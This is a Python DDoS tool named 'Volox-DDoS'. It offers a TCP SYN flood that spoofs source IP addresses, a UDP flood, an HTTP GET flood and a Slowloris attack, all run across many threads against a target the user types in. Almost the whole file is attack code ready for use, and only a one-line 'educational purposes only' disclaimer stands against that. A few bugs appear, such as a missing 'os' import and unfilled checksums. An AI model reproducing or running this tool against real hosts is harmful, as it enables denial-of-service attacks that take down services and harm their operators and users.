#!/usr/bin/env python3
"""
Volox-DDoS: High-Performance Distributed Denial of Service Tool
Multi-threaded, multi-vector attack script with IP spoofing
"""

import socket
import threading
import random
import time
import sys
import ipaddress

class VoloxDDoS:
    def __init__(self):
        self.threads = []
        self.running = False
        self.target_ip = ""
        self.target_port = 0
        self.attack_method = ""
        self.packet_count = 0
        
    def generate_fake_ip(self):
        """Generate random spoofed IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def syn_flood_attack(self):
        """TCP SYN Flood Attack"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while self.running:
            try:
                # Craft TCP SYN packet
                source_ip = self.generate_fake_ip()
                source_port = random.randint(1024, 65535)
                
                # IP Header
                ip_header = self.craft_ip_header(source_ip, self.target_ip)
                # TCP Header
                tcp_header = self.craft_tcp_header(source_port, self.target_port, 2)  # SYN=2
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (self.target_ip, 0))
                self.packet_count += 1
                
                if self.packet_count % 1000 == 0:
                    print(f"[+] Packets sent: {self.packet_count} | Target: {self.target_ip}:{self.target_port}")
                    
            except Exception as e:
                continue
    
    def udp_flood_attack(self):
        """UDP Flood Attack"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1024)  # 1KB random data
        
        while self.running:
            try:
                sock.sendto(data, (self.target_ip, self.target_port))
                self.packet_count += 1
                
                if self.packet_count % 5000 == 0:
                    print(f"[+] UDP Packets: {self.packet_count}")
                    
            except:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    def http_flood_attack(self):
        """HTTP GET/POST Flood"""
        import urllib.request
        import urllib.error
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        
        while self.running:
            try:
                req = urllib.request.Request(f"http://{self.target_ip}", headers=headers)
                urllib.request.urlopen(req, timeout=2)
                self.packet_count += 1
                
                if self.packet_count % 100 == 0:
                    print(f"[+] HTTP Requests: {self.packet_count}")
                    
            except:
                continue
    
    def slowloris_attack(self):
        """Slowloris Attack - Keep connections open"""
        socks = []
        
        while self.running and len(socks) < 1000:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, 80))
                s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
                s.send("User-Agent: Mozilla/4.0\r\n".encode())
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                socks.append(s)
            except:
                break
        
        while self.running:
            for s in socks:
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode())
                except:
                    socks.remove(s)
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((self.target_ip, 80))
                        s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
                        socks.append(s)
                    except:
                        pass
            
            time.sleep(15)
    
    def craft_ip_header(self, src_ip, dst_ip):
        """Craft IP header for raw socket"""
        version = 4
        ihl = 5
        tos = 0
        total_length = 40
        identification = random.randint(1, 65535)
        flags = 0
        ttl = 255
        protocol = socket.IPPROTO_TCP
        
        # Header checksum (simplified)
        checksum = 0
        
        ip_header = bytearray([
            (version << 4) + ihl,
            tos,
            (total_length >> 8) & 0xFF,
            total_length & 0xFF,
            (identification >> 8) & 0xFF,
            identification & 0xFF,
            (flags << 5),
            0,
            ttl,
            protocol,
            (checksum >> 8) & 0xFF,
            checksum & 0xFF
        ])
        
        # Add source and destination IP
        src_bytes = socket.inet_aton(src_ip)
        dst_bytes = socket.inet_aton(dst_ip)
        
        ip_header.extend(src_bytes)
        ip_header.extend(dst_bytes)
        
        return bytes(ip_header)
    
    def craft_tcp_header(self, src_port, dst_port, flags):
        """Craft TCP header"""
        seq = random.randint(0, 4294967295)
        ack_seq = 0
        doff = 5
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        
        offset_res = (doff << 4) + 0
        tcp_flags = flags
        
        tcp_header = bytearray([
            (src_port >> 8) & 0xFF,
            src_port & 0xFF,
            (dst_port >> 8) & 0xFF,
            dst_port & 0xFF,
            (seq >> 24) & 0xFF,
            (seq >> 16) & 0xFF,
            (seq >> 8) & 0xFF,
            seq & 0xFF,
            (ack_seq >> 24) & 0xFF,
            (ack_seq >> 16) & 0xFF,
            (ack_seq >> 8) & 0xFF,
            ack_seq & 0xFF,
            offset_res,
            tcp_flags,
            (window >> 8) & 0xFF,
            window & 0xFF,
            (check >> 8) & 0xFF,
            check & 0xFF,
            (urg_ptr >> 8) & 0xFF,
            urg_ptr & 0xFF
        ])
        
        return bytes(tcp_header)
    
    def start_attack(self, target, port=80, method="syn", threads=100):
        """Start DDoS attack"""
        self.target_ip = target
        self.target_port = port
        self.attack_method = method
        self.running = True
        self.packet_count = 0
        
        print(f"""
        ╔══════════════════════════════════════════════╗
        ║           VOLOX DDoS ATTACK TOOL             ║
        ╠══════════════════════════════════════════════╣
        ║ Target: {target:30} ║
        ║ Port: {port:33} ║
        ║ Method: {method:30} ║
        ║ Threads: {threads:30} ║
        ║ Status: ATTACKING                          ║
        ╚══════════════════════════════════════════════╝
        """)
        
        attack_function = {
            "syn": self.syn_flood_attack,
            "udp": self.udp_flood_attack,
            "http": self.http_flood_attack,
            "slowloris": self.slowloris_attack
        }.get(method, self.syn_flood_attack)
        
        # Create threads
        for i in range(threads):
            thread = threading.Thread(target=attack_function)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        print(f"[+] {threads} attack threads started")
        print("[!] Press Ctrl+C to stop attack\n")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop all attack threads"""
        self.running = False
        print("\n[!] Stopping attack...")
        time.sleep(2)
        print(f"[+] Total packets sent: {self.packet_count}")
        print("[+] Attack terminated")
        sys.exit(0)

def main():
    print("""
    ██╗   ██╗ ██████╗ ██╗      ██████╗ ██╗  ██╗
    ██║   ██║██╔═══██╗██║     ██╔═══██╗╚██╗██╔╝
    ██║   ██║██║   ██║██║     ██║   ██║ ╚███╔╝ 
    ╚██╗ ██╔╝██║   ██║██║     ██║   ██║ ██╔██╗ 
     ╚████╔╝ ╚██████╔╝███████╗╚██████╔╝██╔╝ ██╗
      ╚═══╝   ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
            DDoS Tool - HOLCODE Edition
    """)
    
    ddos = VoloxDDoS()
    
    try:
        target = input("[?] Target IP/Domain: ").strip()
        port = int(input("[?] Target Port (default 80): ") or "80")
        
        print("\n[?] Attack Methods:")
        print("    1. SYN Flood (TCP)")
        print("    2. UDP Flood")
        print("    3. HTTP Flood")
        print("    4. Slowloris")
        
        method_choice = input("\n[?] Select method (1-4): ").strip()
        methods = {"1": "syn", "2": "udp", "3": "http", "4": "slowloris"}
        method = methods.get(method_choice, "syn")
        
        threads = int(input("[?] Threads (default 100): ") or "100")
        
        print("\n[!] WARNING: This tool is for educational purposes only!")
        print("[!] You are responsible for your own actions.")
        confirm = input("\n[?] Start attack? (y/N): ").lower()
        
        if confirm == 'y':
            ddos.start_attack(target, port, method, threads)
        else:
            print("[+] Attack cancelled")
            
    except KeyboardInterrupt:
        print("\n[+] Exiting...")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    # Check for root/admin privileges
    if hasattr(sys, 'getwindowsversion'):
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("[!] Run as Administrator for best performance")
    else:
        if os.geteuid() != 0:
            print("[!] Run as root for best performance")
    
    main()
